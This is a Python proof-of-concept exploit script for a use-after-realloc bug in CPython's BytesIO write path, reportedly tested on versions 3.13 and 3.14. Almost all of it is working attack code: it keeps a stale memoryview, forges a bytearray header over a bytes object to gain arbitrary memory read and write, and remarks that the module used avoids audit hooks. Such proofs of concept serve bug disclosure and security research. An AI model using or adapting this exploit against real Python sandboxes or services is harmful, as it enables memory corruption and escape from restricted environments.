"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Create a memoryview object that can write to a location its not supposed to write to
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Modules/_io/bytesio.c#L184-L244
"""
Py_NO_INLINE static Py_ssize_t
write_bytes(bytesio *self, PyObject *b)
{
    if (check_closed(self)) {
        return -1;
    }
    if (check_exports(self)) { // <--- checks for exports here
        return -1;
    }

    Py_buffer buf;
    if (PyObject_GetBuffer(b, &buf, PyBUF_CONTIG_RO) < 0) { // <-- can call back to python code as of 3.12
        return -1;
    }
    Py_ssize_t len = buf.len;
    if (len == 0) {
        goto done;
    }

    /* ... */
"""
# So the goal here is to get the memoryview of our buffer, then resize the buffer to have it realloc somewhere totally different.
# Once that's done, the memoryview will still be able to write to the location the buffer was at before the realloc, so we can
# fill in that area with a controlled object and use the memoryview to overwrite the header to become an evil bytearray object.

# _io isn't an audited import (unless sys.modules has been cleared beforehand)
from _io import BytesIO

class bytes_subclass(bytes):
    pass

class evil(bytes):
    def __buffer__(self, flags):
        global view, obj
        # grab a memoryview of the buffer after the exports check
        view = obj.getbuffer().cast('P')
        return super().__buffer__(flags)

SIZE = 0x100
obj = BytesIO(bytes(SIZE))

view = None
# because we created our bytes object in a mempool (any object that's allocated with <0x200 bytes),
# when it writes this it has to reallocate the buffer somewhere different (wont realloc in place), 
# but our memoryview will still be able to read/write in the original spot
obj.write(evil(0x20000))
if view is None:
    exit("failed")

# create our controlled object which has its header in a spot our memoryview can write to
mem = bytes_subclass(SIZE - 0x18)

# write evil bytearray object data
view[0] = 0x1
view[1] = id(bytearray)
view[2] = 2**63 - 1
view[3] = 2**63 - 1
view[4] = 0
view[5] = 0
view.release()
del view

# done
print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100

# explicity delete mem to avoid a segfault that happens during cleanup
# (still segfaults half the time for me but it's whatever)
del mem